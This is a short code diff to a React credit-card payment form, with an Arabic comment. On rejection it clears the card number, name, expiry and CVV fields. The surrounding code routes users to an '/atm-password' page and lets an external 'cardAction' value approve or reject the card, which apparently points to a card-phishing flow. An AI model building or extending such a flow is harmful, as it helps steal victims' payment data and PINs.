@@ -118,6 +118,7 @@ export default function CreditCardPayment() {
     handleSubmit,
     watch,
     setValue,
+    reset,
     formState: { errors },
   } = useForm<FormData>({
     resolver: zodResolver(schema),
@@ -192,6 +193,14 @@ export default function CreditCardPayment() {
         navigate("/atm-password");
       } else if (action === 'reject') {
         setRejectedError(true);
+        // تفريغ جميع الحقول عند رفض البطاقة
+        reset({
+          cardNumber: "",
+          nameOnCard: "",
+          expiryMonth: "",
+          expiryYear: "",
+          cvv: "",
+        });
       }
       // Reset card action
       cardAction.value = null;
